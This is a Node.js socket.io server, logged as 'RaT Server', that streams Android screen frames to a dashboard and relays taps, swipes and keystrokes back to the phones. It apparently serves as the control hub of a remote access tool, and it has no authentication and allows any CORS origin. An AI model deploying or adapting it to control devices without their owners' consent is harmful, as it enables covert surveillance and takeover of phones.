const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);

// Serves the Slate Blur UI from your 'public' folder
app.use(express.static('public'));

const io = new Server(server, {
  cors: { origin: "*" },
  // Max payload set to 10MB to handle high-resolution JPEG frames
  maxHttpBufferSize: 1e7 
});

const PORT = process.env.PORT || 3000;

io.on("connection", (socket) => {
  console.log("Connected:", socket.id);

  // Sorting connections into rooms
  socket.on("identify", (type) => {
    if (type === "phone") {
      socket.join("phones");
      console.log(`Android Device joined room "phones": ${socket.id}`);
    } else if (type === "controller") {
      socket.join("controllers");
      console.log(`Dashboard joined room "controllers": ${socket.id}`);
    }
  });

  // 1. SCREEN RELAY: Phone -> Server -> Dashboard
  socket.on("screen_frame", (data) => {
    // Uses .to("controllers") so only the dashboard receives the video
    socket.to("controllers").emit("display_frame", data);
  });

  // 2. COMMAND RELAY: Dashboard -> Server -> Phone
  // This relays Taps, Swipes, Navigation Keys, and Keyboard typing
  socket.on("send_command", (data) => {
    console.log("Relaying command:", data.action);
    // .to("phones") ensures only the Android device gets the command
    io.to("phones").emit("execute_command", data);
  });

  socket.on("disconnect", () => {
    console.log("Disconnected:", socket.id);
  });
});

server.listen(PORT, () => {
  console.log(`RaT Server is live on port ${PORT}`);
});
